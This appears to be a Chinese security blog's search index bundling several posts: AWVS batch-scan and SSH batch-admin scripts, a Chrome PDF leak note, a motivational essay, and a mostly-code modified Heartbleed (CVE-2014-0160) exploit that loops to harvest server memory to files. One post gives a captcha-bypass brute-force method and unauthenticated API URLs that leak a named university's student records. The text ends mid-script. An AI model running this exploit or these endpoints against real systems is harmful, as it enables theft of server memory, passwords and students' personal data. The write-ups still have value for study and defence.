<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Python批量运维之执行命令（ssh登录）]]></title>
    <url>%2FPython%E6%89%B9%E9%87%8F%E8%BF%90%E7%BB%B4%E4%B9%8B%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%88ssh%E7%99%BB%E5%BD%95%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前言最近由于工作的原因，需要给客户安装防护软件，由于对方大部分机器都是Linux系统并且未使用运维管理类的软件。因此需要人工一台台登录执行命令（数量大约2000台），但所幸的是软件的安装部署已集成脚本，只需要执行./ 执行即可。 前后写过两次脚本，第一次由于没有考虑到root账号不能直接ssh登录，无法正常执行安装。因此第二次增加了执行su -l后自动填入密码切换至root权限后再执行。 坏境Windows 2012 + Python2.7 + paramiko模块此环境为申请到的堡垒机，其他设备不能直接接入内网。（由于paramiko模块并非Python自带，需要pip或者手动安装，鉴于机器处在物理隔离的环境中，因此选择手动安装。） 用法根据客户给出的系统密码表excel，将机器信息整理成以下格式并保存为txt（ip:user:pass:port:root_pw）程序会自动读取txt内容，然后进行登录-&gt;切换权限-&gt;执行命令。 ##################（晚点填）################### 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# -*- coding: UTF-8 -*-import timeimport paramikocmdtext = 'uname -r'#要执行的命令def verification_ssh(host,username,password,port,root_pwd,cmd): s=paramiko.SSHClient() s.load_system_host_keys() s.set_missing_host_key_policy(paramiko.AutoAddPolicy()) s.connect(hostname = host,port=int(port),username=username, password=password) if username != 'root': ssh = s.invoke_shell() time.sleep(0.1) ssh.send('su -\n') buff = '' while not buff.endswith('Password: '): resp = ssh.recv(9999) buff +=resp ssh.send(root_pwd) ssh.send('\n') buff = '' while not buff.endswith('# '): resp = ssh.recv(9999) buff +=resp ssh.send(cmd) ssh.send('\n') buff = '' while not buff.endswith('# '): resp = ssh.recv(9999) buff +=resp s.close() result = buff else: stdin, stdout, stderr = s.exec_command(cmd) result = stdout.read() s.close() return resultif __name__ == "__main__": for i in open('ssh.txt'): if '#' in i[0]: pass else: ssh_list = i.strip().split(':') try: result = verification_ssh(host=ssh_list[0], username=ssh_list[2],password=ssh_list[3],port=ssh_list[1],root_pwd=ssh_list[4],cmd=cmdtext) if 'Install G01 success' in result:# 判断是否安装成功 print ssh_list[0],'Install G01 Success!' with open('install_log.txt','a') as f: text = ssh_list[0]+"-----------------------\n"+result+"-----------------------\n" f.write(text) elif 'FAILED' in result:#判断相关服务未启动 print ssh_list[0],'FAILED' with open('FAILED_log.txt', 'a') as f: text = ssh_list[0] + "-----------------------\n" + result + "-----------------------\n" f.write(text) else: print ssh_list[0],'Install Error'#判断安装失败 with open('error.txt', 'a') as f: text = ssh_list[0] + "-----------------------\n" + result + "-----------------------\n" f.write(text) except:#无法ssh print ssh_list[0],'ssh error' with open('no_ssh.txt','a') as f: text = ssh_list[0]+'\n' f.write(text)]]></content>
      <tags>
        <tag>Python</tag>
        <tag>批量运维</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql注入总结(待填坑)]]></title>
    <url>%2FMysql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93(%E5%BE%85%E5%A1%AB%E5%9D%91)%2F</url>
    <content type="text"><![CDATA[Please enter the password to read the blog. Incorrect Password! No content to display! U2FsdGVkX1800JubV1EtmyR16cJ0O9JSjUgzvKLLFZVKPMN2T+KgH4Hw1+LtjlinS4GfYFGuqrWYgcuJ5nEpAaECRorRevgRJdGPRgjq638lVCQtVVlqk+0/jCtsCJijBR59OHF2r2TZqKDZtC/Un64DWg3kYpp5IuvANE3D6bsmKfKHrP5EMKCEeScJ6fjYrP8rMChQAPUKj3ATYe8RtKMQSryhy+bMANNty0s7jeMz1Wydfe6Jt52yRt5vnxBY/dU5lzXhksBjxdByqqrhNaSRW1ko/HZcqCaN59Wo+g5eKyLe4DPP0rUGIXFsYU16lQXgeyv28bgJE9ysSCQklxJwfk+fVN6re8lal1aa7snJx2iTSmnC2/zB4x5Qqfggr1Pyfm4FDrNaPR4nP4XucDXAJVaBhRf6g1bJzTZDT6Vgdr5krdH5We4uZLoL77uzW8OAJhfYm/OWlWbKqKZIfQaab6UJ+HoHoI985QpCHJNQHHtz4LbwxuCilPOKB37IDEJi0FO0ECpr7otsBA8Sv5qozfHzev0Hol8l/IiriX4=]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Awvs11批量添加脚本 V2.0（基于上一次修改 增加6种扫描模式）]]></title>
    <url>%2FAwvs11%E6%89%B9%E9%87%8F%E6%B7%BB%E5%8A%A0%E8%84%9A%E6%9C%AC%20V2.0%EF%BC%88%E5%9F%BA%E4%BA%8E%E4%B8%8A%E4%B8%80%E6%AC%A1%E4%BF%AE%E6%94%B9%20%E5%A2%9E%E5%8A%A06%E7%A7%8D%E6%89%AB%E6%8F%8F%E6%A8%A1%E5%BC%8F%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前言在原先增加多线程的基础上做了两处修改。1.awvs中密码不需要手动加密成sha2562.增加6种扫描模式（AWVS中的，原先是默认全扫描） 讲道理awvs在web扫描种还是有不错的效果（没钱） 立个flag：有时间了就捣鼓下基于awvs引擎的扫描器，换个皮，输入输出，伟大的国产扫描器诞生了！售价五毛钱一斤（手动滑稽） 截图 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182# -*- coding:utf-8 -*-# python2.7import urllib2import sslimport jsonimport timeimport hashlibimport threadingthread_max = 100 # 程序线程threads = []del_int = 10 #循环删除次数URL_FILE = &apos;url.txt&apos;#要扫描的url列表（不加http://）&apos;&apos;&apos;----------改动---------1.awvs密码不需要手动进行sha256加密2.增加六种扫描方式----------改动---------&apos;&apos;&apos;#The second revision comes from GuoKer# localhost:3443全部替换为awvs所在的服务器及端口username = &apos;admin@admin.com&apos;password = &apos;Admin123456&apos;# 账号邮箱与密码明文pw = hashlib.sha256(password).hexdigest()try: _create_unverified_https_context = ssl._create_unverified_contextexcept AttributeError: passelse: ssl._create_default_https_context = _create_unverified_https_contextpatterns = [ &apos;11111111-1111-1111-1111-111111111112&apos;, &apos;11111111-1111-1111-1111-111111111115&apos;, &apos;11111111-1111-1111-1111-111111111117&apos;, &apos;11111111-1111-1111-1111-111111111116&apos;, &apos;11111111-1111-1111-1111-111111111113&apos;, &apos;11111111-1111-1111-1111-111111111111&apos;,]url_login = &quot;https://localhost:3443/api/v1/me/login&quot;send_headers_login = &#123; &apos;Host&apos;: &apos;localhost:3443&apos;, &apos;Accept&apos;: &apos;application/json, text/plain, */*&apos;, &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&apos;, &apos;Accept-Encoding&apos;: &apos;gzip, deflate, br&apos;, &apos;Content-Type&apos;: &apos;application/json;charset=utf-8&apos;&#125;data_login = &apos;&#123;&quot;email&quot;:&quot;&apos; + username + &apos;&quot;,&quot;password&quot;:&quot;&apos; + pw + &apos;&quot;,&quot;remember_me&quot;:false&#125;&apos;req_login = urllib2.Request(url_login, headers=send_headers_login)response_login = urllib2.urlopen(req_login, data_login)xauth = response_login.headers[&apos;X-Auth&apos;]COOOOOOOOkie = response_login.headers[&apos;Set-Cookie&apos;]#print&quot;当前验证信息如下\r\n cookie : %r \r\n X-Auth : %r &quot; % (COOOOOOOOkie, xauth)send_headers2 = &#123; &apos;Host&apos;: &apos;localhost:3443&apos;, &apos;Accept&apos;: &apos;application/json, text/plain, */*&apos;, &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&apos;, &apos;Content-Type&apos;: &apos;application/json;charset=utf-8&apos;, &apos;X-Auth&apos;: xauth, &apos;Cookie&apos;: COOOOOOOOkie&#125;# 以上代码实现登录（获取cookie）和校验值#-------------------------------------------------------------------------url = &quot;https://localhost:3443/api/v1/targets&quot;def add_exec_scan(url_txt): target_url = &apos;http://&apos; + url_txt data = &apos;&#123;&quot;description&quot;:&quot;222&quot;,&quot;address&quot;:&quot;&apos; + target_url + &apos;&quot;,&quot;criticality&quot;:&quot;10&quot;&#125;&apos; # data = urllib.urlencode(data)由于使用json格式所以不用添加 req = urllib2.Request(url, headers=send_headers2) response = urllib2.urlopen(req, data) jo = json.loads(response.read()) target_id = jo[&apos;target_id&apos;] # 获取添加后的任务ID # 以上代码实现批量添加 url_scan = &quot;https://localhost:3443/api/v1/scans&quot; headers_scan = &#123; &apos;Host&apos;: &apos;localhost:3443&apos;, &apos;Accept&apos;: &apos;application/json, text/plain, */*&apos;, &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&apos;, &apos;Accept-Encoding&apos;: &apos;gzip, deflate, br&apos;, &apos;Content-Type&apos;: &apos;application/json;charset=utf-8&apos;, &apos;X-Auth&apos;: xauth, &apos;Cookie&apos;: COOOOOOOOkie, &#125; #3 = xss data_scan = &apos;&#123;&quot;target_id&quot;:&apos; + &apos;\&quot;&apos; + target_id + &apos;\&quot;&apos; + &apos;,&quot;profile_id&quot;:\&quot;&apos;+patterns[patter-1]+&apos;\&quot;,&quot;schedule&quot;:&#123;&quot;disable&quot;:false,&quot;start_date&quot;:null,&quot;time_sensitive&quot;:false&#125;,&quot;ui_session_id&quot;:&quot;66666666666666666666666666666666&quot;&#125;&apos; req_scan = urllib2.Request(url_scan, headers=headers_scan) response_scan = urllib2.urlopen(req_scan,str(data_scan)) print target_url + &quot;添加成功！&quot; threads.pop(0)#线程序结束标志def count(): url_count = &quot;https://localhost:3443/api/v1/notifications/count&quot; req_count = urllib2.Request(url_count, headers=send_headers2) response_count = urllib2.urlopen(req_count) print&quot;当前存在%r个通知！&quot; % json.loads(response_count.read())[&apos;count&apos;] print&quot;-&quot; * 20 # print&quot;已存在以下任务&quot; url_info = &quot;https://localhost:3443/api/v1/scans&quot; req_info = urllib2.Request(url_info, headers=send_headers2) response_info = urllib2.urlopen(req_info) all_info = json.loads(response_info.read()) num = 0 for website in all_info.get(&quot;scans&quot;): num += 1 # print # website.get(&quot;target&quot;).get(&quot;address&quot;) + &quot;\n target_id:&quot; + website.get(&quot;scan_id&quot;) print&quot;共 %r个扫描任务(最多显示100个))&quot; % num# count()# scan、target、notification！def del_targets(): url_info = &quot;https://localhost:3443/api/v1/targets&quot; req_info = urllib2.Request(url_info, headers=send_headers2) response_info = urllib2.urlopen(req_info) all_info = json.loads(response_info.read()) for website in all_info[&quot;targets&quot;]: while True: if thread_max &gt; len(threads): threads.append(threading.Thread(target=del_tmp,args=(website,)).start())#启动子线程 break# del_targets()def del_tmp(website): #删除任务 if (website.get(&quot;description&quot;)) == &quot;222&quot;: try: url_scan_del = &quot;https://localhost:3443/api/v1/targets/&quot; + str(website[&quot;target_id&quot;]) req_del = urllib2.Request(url_scan_del, headers=send_headers2) req_del.get_method = lambda: &apos;DELETE&apos; response_del = urllib2.urlopen(req_del) print &quot;ok!&quot; threads.pop(0)#线程序结束标志 except: exit()if __name__ == &quot;__main__&quot;: print &quot;-&quot; * 20 count() print&quot;&quot;&quot; 1、添加扫描任务并执行请输入1 2、删除所有使用该脚本添加的任务请输入2 &quot;&quot;&quot; choice = raw_input(&quot;&gt;&quot;) # print type(choice) if choice == &quot;1&quot;: print&quot;&quot;&quot; #1.高风险漏洞 #2.弱密码扫描 #3.仅爬行 #4.XSS跨站扫描 #5.SQL注入扫描 #6.全扫描 &quot;&quot;&quot; patter = int(input(&quot;&gt;&gt;&quot;)) start_time = time.time() for url_txt in open(URL_FILE,&apos;r&apos;).read().split(): while True: if thread_max &gt; len(threads): # threads.append(threading.Thread(target=add_exec_scan,args=(url_txt,)).start())#启动线程 t = threading.Thread(target=add_exec_scan,args=(url_txt,)) t.start() #t.join() threads.append(t) break t.join() # for i in thread_max: # t = threads.append(threading.Thread(target=add_exec_scan,args=(url_txt,))) count() all_time = time.time() - start_time print &apos;共用时&apos;,all_time elif choice == &quot;2&quot;: for i in range(del_int): del_targets() count() else: print &quot;请重新运行并请输入1、2选择。&quot; 附上扫描模式ID 12345611111111-1111-1111-1111-111111111112 高风险漏洞11111111-1111-1111-1111-111111111115 弱密码扫描11111111-1111-1111-1111-111111111117 仅爬行11111111-1111-1111-1111-111111111116 XSS跨站扫描11111111-1111-1111-1111-111111111113 SQL注入扫描11111111-1111-1111-1111-111111111111 全扫描]]></content>
      <tags>
        <tag>Python</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[南宁学院教务系统绕过登录验证码登陆与平行权限信息泄露]]></title>
    <url>%2F%E5%8D%97%E5%AE%81%E5%AD%A6%E9%99%A2%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F%E7%BB%95%E8%BF%87%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81%E7%A0%81%E7%99%BB%E9%99%86%E4%B8%8E%E5%B9%B3%E8%A1%8C%E6%9D%83%E9%99%90%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%2F</url>
    <content type="text"><![CDATA[一、绕过验证码登陆教务系统登陆界面存在验证码登陆能有效增加攻击者枚举学生教务系统密码成本，但app接口并未作验证码验证且不记录错误次数，因此可以批量对同学们的教务密码进行枚举 1http://jw.nnxy.cn/app.do?method=authUser&amp;xh=学号&amp;pwd=密码 （登陆成功返回token）因此利用如下信息泄露检验学号是否存在，并使用top100password（弱口令排行前100的密码）进行检测（共407条学号）。 二、平行权限信息泄露通过app接口登陆成功后会返回token，利用该token可以查询学生部分信息。 但利用该token不仅可以查询本人部分信息（姓名、院系、班级、考生号等），同时修改xh参数为其他同学的学号也可以进行查询。因此尝试获取20160111001-20160116050之间的同学信息。 附： 123456789个人信息：http://jw.nnxy.cn/app.do?method=getUserInfo&amp;xh=20160116045课表查询：http://jw.nnxy.cn/app.do?method=getKbcxAzc&amp;xh=20160116045&amp;xnxqid=2018-2019-1&amp;zc=7成绩查询：http://jw.nnxy.cn/app.do?method=getCjcx&amp;xh=20160116045&amp;xnxqid=2017-2018-2学生教评：http://jw.nnxy.cn/app.do?method=getPjpcList&amp;xh=20160116045学籍预警：http://jw.nnxy.cn/app.do?method=getEarlyWarnInfo&amp;xh=20160116045&amp;history=1考试查询：http://jw.nnxy.cn/app.do?method=getKscx&amp;xh=20160116045 均未对身份进行验证。声明：对测试时抓取到的学生信息及数据，本人并未在任何平台公开发布、贩卖。]]></content>
      <tags>
        <tag>信息泄露</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Chrome浏览器打开PDF造成的信息泄露]]></title>
    <url>%2FChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80PDF%E9%80%A0%E6%88%90%E7%9A%84%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%2F</url>
    <content type="text"><![CDATA[前言前些天国外安全团队edgepot.it公开披露了Chrome浏览器通过打开pdf文件造成信息泄露的0day漏洞。一旦用户使用chrome浏览器查看精心构造的pdf文件，便会将用户设备数据回传给攻击者。 漏洞成因根据在野利用的恶意PDF发现，造成该漏洞的根源在于chrome内置PDF阅读器未对 this.submitForm()这个Javascript API （Adobe中对该函数的定义是将表单提交到指定URL）的操作进行控制，从而导致漏洞利用。 漏洞复现通过调用this.submitForm(‘http://baidu.com&#39;)即可向任意URL发送数据 根据发送的数据可知该漏洞可泄露的信息如下：1.用户ip2.操作系统及Chrome版本号3.PDF所在计算机的绝对路径路径 附加（内置PDF阅读器所支持的JavascriptAPI）12345app.launchURL()app.media.getURLdata()app.alert()app.execDialog()doc.getURL() 安全建议：虽然该漏洞不能直接造成代码执行，但在实际攻击中，有助于攻击者进一步获取目标信息，提高后续攻击的成功率（例如配合WinRAR的那个漏洞）目前补丁未出，建议暂时不要用chrome查看pdf，不打开来历不明的pdf文件。]]></content>
      <tags>
        <tag>信息泄露</tag>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Heartbleed2.0（搜集信息）]]></title>
    <url>%2FHeartbleed2.0%EF%BC%88%E6%90%9C%E9%9B%86%E4%BF%A1%E6%81%AF%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前言继Heartbleed心脏出血-循环搜集脚本后做了写调整。原先是在main里头做的循环，发现循环时间长了会导致错误。因此换到了hit_hb里头在调用hexdump之前做循环，并增加了异常处理（调用出现错误会强制等待5分钟）以及按照公司某位大佬的要求，添加了两个方法get_FileSize、file_judge用作获取文件大小（单位MB）判断是否大与设定值，新命名再将心跳响应写入。 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218# -*- coding: UTF-8 -*-# Exploit Title: [OpenSSL TLS Heartbeat Extension - Memory Disclosure - Multiple SSL/TLS versions]# Date: [2014-04-09]# Exploit Author: [Csaba Fitzl]# Vendor Homepage: [http://www.openssl.org/]# Software Link: [http://www.openssl.org/source/openssl-1.0.1f.tar.gz]# Version: [1.0.1f]# Tested on: [N/A]# CVE : [2014-0160]#The second revision comes from Guoker#!/usr/bin/env python# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)# The author disclaims copyright to this source code.# Modified by Csaba Fitzl for multiple SSL / TLS version support'''-------------改动1-14--------------1.增加两个参数-t -d2.循环接收心跳响应3.接收到的响应保存至文档4.去除偏移地址和非ascii字符-------------改动1-23--------------1.增加get_FileSize方法用于获取文件大小2.增加file_judge方法用于判断文件大小3.增加两处异常处理：接收心跳响应错误、文件写入错误PS：文件大于10M时自动创建文件名+1后再写入如果写到out.txt88时手动退出了，下次启动要加上 -d out.txt88'''import sysimport structimport socketimport timeimport selectimport reimport osfrom optparse import OptionParseroptions = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')options.add_option('-t', '--time', type='int', default=10, help='Time to test (default: 10)')options.add_option('-d', '--dest', type='str', default='out.txt', help='Text output to test (default: out.txt)')version = []version.append(['SSL 3.0','03 00'])version.append(['TLS 1.0','03 01'])version.append(['TLS 1.1','03 02'])version.append(['TLS 1.2','03 03'])i = 0tmp_file = Nonedef h2bin(x): return x.replace(' ', '').replace('\n', '').decode('hex')def create_hello(version): hello = h2bin('16 ' + version + ' 00 dc 01 00 00 d8 ' + version + ''' 5343 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cfbd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de 0000 66 c0 14 c0 0a c0 22 c0 21 00 39 00 38 00 8800 87 c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1cc0 1b 00 16 00 13 c0 0d c0 03 00 0a c0 13 c0 09c0 1f c0 1e 00 33 00 32 00 9a 00 99 00 45 00 44c0 0e c0 04 00 2f 00 96 00 41 c0 11 c0 07 c0 0cc0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 1100 08 00 06 00 03 00 ff 01 00 00 49 00 0b 00 0403 00 01 02 00 0a 00 34 00 32 00 0e 00 0d 00 1900 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 0800 06 00 07 00 14 00 15 00 04 00 05 00 12 00 1300 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 0000 0f 00 01 01''') return hellodef create_hb(version): hb = h2bin('18 ' + version + ' 00 03 01 ff ff') return hbdef get_FileSize(filePath): filePath = unicode(filePath,'utf8') fsize = os.path.getsize(filePath) fsize = fsize/float(1024*1024) return round(fsize,2)def file_judge(): opts, args = options.parse_args() global i global tmp_file if get_FileSize(tmp_file) &gt; 10: i += 1 tmp_file = opts.dest + str(i)def hexdump(s): opts, args = options.parse_args() pdat = '' times = time.strftime('%Y-%m-%d-%H:%M:%S',time.localtime(time.time())) for b in xrange(0, len(s), 16): lin = [c for c in s[b : b + 16]] pdat += ''.join((c if 32 &lt;= ord(c) &lt;= 126 else '.' )for c in lin) print '%s' % (pdat.replace('......', ''),) print '-----------------------'+times+'---------------------------------'#获取心跳内容后写入 try: with open(tmp_file,'a') as f: f.write('%s' % (pdat.replace('......', ''),)) f.write('-----------------------'+times+'---------------------------------') except : with open('error.txt','a') as f: f.write('%s' % (pdat.replace('......', ''),)) f.write('-----------------------'+times+'---------------------------------')def recvall(s, length, timeout=5): endtime = time.time() + timeout rdata = '' remain = length while remain &gt; 0: rtime = endtime - time.time() if rtime &lt; 0: return None r, w, e = select.select([s], [], [], 5) if s in r: data = s.recv(remain) # EOF? if not data: return None rdata += data remain -= len(data) return rdatadef delay(int):#延迟方法 time.sleep(int)def recvmsg(s): hdr = recvall(s, 5) if hdr is None: print 'Unexpected EOF receiving record header - server closed connection' return None, None, None typ, ver, ln = struct.unpack('&gt;BHH', hdr) pay = recvall(s, ln, 10) if pay is None: print 'Unexpected EOF receiving record payload - server closed connection' return None, None, None print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)) return typ, ver, paydef hit_hb(s,hb): opts, args = options.parse_args() s.send(hb) while True: typ, ver, pay = recvmsg(s) if typ is None: print 'No heartbeat response received, server likely not vulnerable' return False if typ == 24: print 'Received heartbeat response:' while True:#循环hexdump后延迟 try: hexdump(pay) file_judge() delay(opts.time) except KeyboardInterrupt: print 'Exit！' exit() except:#如果发生错误，强制等待5分钟后重试 print 'Error Forced Delay of 5 Minutes' delay(300) if len(pay) &gt; 3: print 'WARNING: server returned more data than it should - server is vulnerable!' else: print 'Server processed malformed heartbeat, but did not return any extra data.' return True if typ == 21: print 'Received alert:' hexdump(pay) print 'Server returned error, likely not vulnerable' return False def main(): opts, args = options.parse_args() global tmp_file if len(args) &lt; 1: options.print_help() return tmp_file = opts.dest for i in range(len(version)): print 'Trying ' + version[i][0] + '...' s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) print 'Connecting...' sys.stdout.flush() s.connect((args[0], opts.port)) print 'Sending Client Hello...' sys.stdout.flush() s.send(create_hello(version[i][3])) print 'Waiting for Server Hello...' sys.stdout.flush() while True: typ, ver, pay = recvmsg(s) if typ == None: print 'Server closed connection without sending Server Hello.' return # Look for server hello done message. if typ == 22 and ord(pay[0]) == 0x0E: break print 'Sending heartbeat request...' sys.stdout.flush() s.send(create_hb(version[i][4])) if hit_hb(s,create_hb(version[i][5])): #Stop if vulnerable breakif __name__ == '__main__': main()]]></content>
      <tags>
        <tag>Python</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你必须非常努力，才能看起来毫不费力。]]></title>
    <url>%2F%E4%BD%A0%E5%BF%85%E9%A1%BB%E9%9D%9E%E5%B8%B8%E5%8A%AA%E5%8A%9B%EF%BC%8C%E6%89%8D%E8%83%BD%E7%9C%8B%E8%B5%B7%E6%9D%A5%E6%AF%AB%E4%B8%8D%E8%B4%B9%E5%8A%9B%E3%80%82%2F</url>
    <content type="text"><![CDATA[有一群人，他们积极自律，每天按计划行事，有条不紊；他们不张扬，把自己当成最卑微的小草，等待着人生开出花朵的那天。他们早晨5点多起来健身，你在睡觉；7点开始享受丰盛的早餐，蛋白质维生素淀粉粗纤维样样俱全，为新的一天起了一个好头，当他们收拾妥当准备开始一整天的工作时，你还在睡觉； 他们用上午的高效时间完成了一个又一个任务，甚至发现的新的商机，发现了有可能给人生带来改观的机遇，当午餐时间临近，他们伸了伸腰，准备稍作休息，此时你终于起床。他们的午餐不铺张浪费，却营养全面，他们有选择的进食，因为清楚的知道自己想要的是什么，而你也在起床之后但觉到了饿意，你早早的洗了把脸，甚至连牙都没刷，打开冰箱，拿出了昨晚跟朋友high过之后带回来的薯条以及可乐；午睡之后，他们重新积极的投入工作，而你也终于吃饱喝足，坐在了电脑前。是的，你的一天开始了。晚上回到家里，他们也打开了电脑，也许是为了完成白天没来得及做完的工作，也许是因为前两天刚报了一个网络课堂，此时你还沉浸在dota中，你发的贴子还不够有人气，你发现空老师又更新微薄了，电视剧里男女猪脚还没有最后在一起，作恶多端的女二号还没有得到应有的报应。终于，22点到了，他们停下了工作，或许去满满的书架上拿下了一本书，或许拿起了自己心爱的乐器打算练练手，或许已经上床睡觉。当然，睡之前他们会想一想，自己在这一天都做了什么，有什么收获，又有什么教训。最后，他们又重新提醒了一下自己那个埋在内心深处的梦想，然后满意的睡去了。此时的你还在等待升级，还在顶贴子，还在刷微薄，还在为了男一号女一号哭哭啼啼，你的一天才刚刚开始精彩。后半夜，你隐约感到了困意，依依不舍的关掉了电脑，身上已经很臭，你却懒得去洗一个澡。你走向了乱糟糟的床，钻进了肮脏的被窝，掏出了手机——是的，爪机党伤不起。你隐约知道自己的身边有那么一群“他们”，可是你却没有办法实实在在的感受到他们的存在。直到有一天，你和“他/她”终于浪漫的相见了——他/她是老总，你是普通的打工仔；他/她是主任，你是弱爆了的小职员；他/她游历各国，念着你想念的大学，拍着你想拍的照片，过着你想过的生活，他/她各种恣意的小清新，而你，是的，我知道你恨小清新，可是这又有什么关系？事实已经如此，你就是那个电脑荧光照射下的SB。]]></content>
      <tags>
        <tag>鸡汤</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Awvs11批量添加、批量删除脚本多线程版（多线程学习）]]></title>
    <url>%2FAwvs11%E6%89%B9%E9%87%8F%E6%B7%BB%E5%8A%A0%E3%80%81%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4%E8%84%9A%E6%9C%AC%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%89%88%EF%BC%88%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AD%A6%E4%B9%A0%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前言声明：该脚本的作者是jamesj老哥于 2017-5-24 12:03在吾爱上发布的，我拿到脚本后用了一段时间，觉得有些问题，趁着学习python的这段时间，修改下源码练练手。 正文有的时候当拿到单位给的大量网站进行漏扫（已授权）但又没买专业扫描器时，人工检测效率太低，就只能靠着网上的免（po）费（jie）扫描器混吃等死。。。 改动如下： 1.多线程添加扫描任务2.删除原程序不常用的功能（删除所有扫描任务、查看已存在任务）3.多线程删除已添加任务（由于awvs每次只返回100个任务，原代码每次只能删出一百条，需要重复输入） 附上代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155# -*- coding:utf-8 -*-import urllib2import sslimport jsonimport timeimport threadingthread_max = 20 # 程序线程threads = []del_int = 10 #循环删除次数URL_FILE = 'url.txt'#要扫描的url列表（不加http://）'''----------改动---------1.多线程添加扫描任务2.删除原程序不常用的功能（删除所有扫描任务、查看已存在任务）3.多线程删除已添加任务（由于awvs每次只返回100个任务，原代码每次只能删出一百条，需要重复输入）----------改动---------'''#The second revision comes from GuoKer __author = "jamesj"# localhost:3443全部替换为awvs所在的服务器及端口username = 'guokers@gov.cn'# 账号邮箱pw = 'a50ce9f2d32efac35d30e962bd6e08899e3f0aece837b0198ac55b86fd85e199'# sha256加密后的密码。try: _create_unverified_https_context = ssl._create_unverified_contextexcept AttributeError: passelse: ssl._create_default_https_context = _create_unverified_https_contexturl_login = "https://localhost:3443/api/v1/me/login"send_headers_login = &#123; 'Host': 'localhost:3443', 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3', 'Accept-Encoding': 'gzip, deflate, br', 'Content-Type': 'application/json;charset=utf-8'&#125;data_login = '&#123;"email":"' + username + '","password":"' + pw + '","remember_me":false&#125;'req_login = urllib2.Request(url_login, headers=send_headers_login)response_login = urllib2.urlopen(req_login, data_login)xauth = response_login.headers['X-Auth']COOOOOOOOkie = response_login.headers['Set-Cookie']#print"当前验证信息如下\r\n cookie : %r \r\n X-Auth : %r " % (COOOOOOOOkie, xauth)send_headers2 = &#123; 'Host': 'localhost:3443', 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3', 'Content-Type': 'application/json;charset=utf-8', 'X-Auth': xauth, 'Cookie': COOOOOOOOkie&#125;# 以上代码实现登录（获取cookie）和校验值#-------------------------------------------------------------------------url = "https://localhost:3443/api/v1/targets"def add_exec_scan(url_txt): target_url = 'http://' + url_txt data = '&#123;"description":"222","address":"' + target_url + '","criticality":"10"&#125;' # data = urllib.urlencode(data)由于使用json格式所以不用添加 req = urllib2.Request(url, headers=send_headers2) response = urllib2.urlopen(req, data) jo = json.loads(response.read()) target_id = jo['target_id'] # 获取添加后的任务ID # 以上代码实现批量添加 url_scan = "https://localhost:3443/api/v1/scans" headers_scan = &#123; 'Host': 'localhost:3443', 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3', 'Accept-Encoding': 'gzip, deflate, br', 'Content-Type': 'application/json;charset=utf-8', 'X-Auth': xauth, 'Cookie': COOOOOOOOkie, &#125; data_scan = '&#123;"target_id":' + '\"' + target_id + '\"' + 